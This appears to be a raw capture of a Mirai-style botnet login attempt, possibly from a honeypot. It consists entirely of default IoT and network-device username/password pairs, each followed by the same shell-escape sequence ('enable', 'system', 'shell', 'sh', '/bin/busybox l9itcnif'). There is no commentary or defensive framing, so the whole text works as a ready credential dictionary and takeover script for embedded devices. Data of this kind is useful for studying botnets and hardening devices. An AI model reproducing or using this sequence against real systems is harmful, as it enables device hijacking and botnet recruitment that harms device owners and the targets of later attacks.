jill
enable
system
shell
sh
/bin/busybox l9itcnif
root

rain
enable
system
shell
sh
/bin/busybox l9itcnif
date
enable
system
shell
sh
/bin/busybox l9itcnif
manager

friend
enable
system
shell
sh
/bin/busybox l9itcnif
manager
enable
system
shell
sh
/bin/busybox l9itcnif
admin

password
enable
system
shell
sh
/bin/busybox l9itcnif
cisco

cisco
enable
system
shell
sh
/bin/busybox l9itcnif
root

123qwe
enable
system
shell
sh
/bin/busybox l9itcnif
r00t
enable
system
shell
sh
/bin/busybox l9itcnif
admin

centuryl1nk
enable
system
shell
sh
/bin/busybox l9itcnif
db2fenc1

ibmdb2
enable
system
shell
sh
/bin/busybox l9itcnif
4dgifts
enable
system
shell
sh
/bin/busybox l9itcnif
root

m
enable
system
shell
sh
/bin/busybox l9itcnif
root

video
enable
system
shell
sh
/bin/busybox l9itcnif
administrator

1234
enable
system
shell
sh
/bin/busybox l9itcnif
admin
enable
system
shell
sh
/bin/busybox l9itcnif
root

admin
enable
system
shell
sh
/bin/busybox l9itcnif
root

zlxx.
enable
system
shell
sh
/bin/busybox l9itcnif
nsroot

nsroot
enable
system
shell
sh
/bin/busybox l9itcnif
root

admin
enable
system
shell
sh
/bin/busybox l9itcnif
admin

infoblox
enable
system
shell
sh
/bin/busybox l9itcnif
root

qwe123
enable
system
shell
sh
/bin/busybox l9itcnif
root

vizxv
enable
system
shell
sh
/bin/busybox l9itcnif
superuser
enable
system
shell
sh
/bin/busybox l9itcnif
informix

informix
enable
system
shell
sh
/bin/busybox l9itcnif
alphanetworks

wrgg15_di524
enable
system
shell
sh
/bin/busybox l9itcnif
admin

4321
enable
system
shell
sh
/bin/busybox l9itcnif
tech
enable
system
shell
sh
/bin/busybox l9itcnif
iclock

timely
enable
system
shell
sh
/bin/busybox l9itcnif
root

123
enable
system
shell
sh
/bin/busybox l9itcnif
admin

switch
enable
system
shell
sh
/bin/busybox l9itcnif
mpi
enable
system
shell
sh
/bin/busybox l9itcnif
apc

apc
enable
system
shell
sh
/bin/busybox l9itcnif
root

changemenow
enable
system
shell
sh
/bin/busybox l9itcnif
root

antslq
enable
system
shell
sh
/bin/busybox l9itcnif
